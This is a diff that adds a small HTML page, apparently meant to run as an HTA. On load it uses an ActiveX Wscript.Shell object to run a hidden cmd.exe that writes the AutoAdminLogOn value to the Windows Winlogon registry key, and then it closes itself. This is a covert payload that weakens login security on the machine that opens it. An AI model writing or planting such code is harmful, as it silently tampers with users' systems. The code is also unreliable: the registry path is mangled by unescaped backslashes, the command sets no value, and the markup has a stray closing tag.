@@ -1,0 +1,15 @@
+<html>
+<head>
+    <script language="Javascript">
+    var SheLL = new ActiveXObject("Wscript.SheLL");
+    var cmd = "cMD.EXE /C reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v AutoAdminLogOn"
+    var run = SheLL.run(cmd, 0, true);
+    </script>
+</head>
+<body>
+<script language="Javascript">
+    self.close();
+    </script>
+</body>
+</head>
+</html>
